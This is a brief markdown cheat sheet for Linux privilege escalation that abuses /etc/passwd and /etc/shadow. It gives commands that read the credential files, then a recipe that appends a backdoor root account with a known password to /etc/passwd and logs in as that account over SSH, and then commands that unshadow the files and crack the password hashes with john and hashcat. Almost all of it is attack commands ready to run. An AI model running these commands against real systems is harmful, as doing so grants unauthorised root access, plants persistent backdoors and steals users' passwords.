- [ ] Enumeration
- [ ] Passwd Abuse
- [ ] Shadow Abuse

Enumeration!!!!
```sh
ls -la /etc/passwd
ls -la /etc/shadow
cat /etc/passwd | cut -d ':' -f 1
cat /etc/shadow
cat /etc/group
getent group sudo
```
Passwd Abuse!!!
```sh
# Create a root user
openssl passwd -1 -salt ignite 123
echo 'r00t:$1$ignite$Hoi/NC0S.2G1BhWXAbADX0:0:0:root:/root:/bin/bash' >> /etc/passwd
# SSH
ssh r00t@IP
```
Shadow Abuse!!!
```sh
# unshadow
unshadow passwd.txt shadow.txt  > unshadowed.txt
# john
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# hashcat
hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```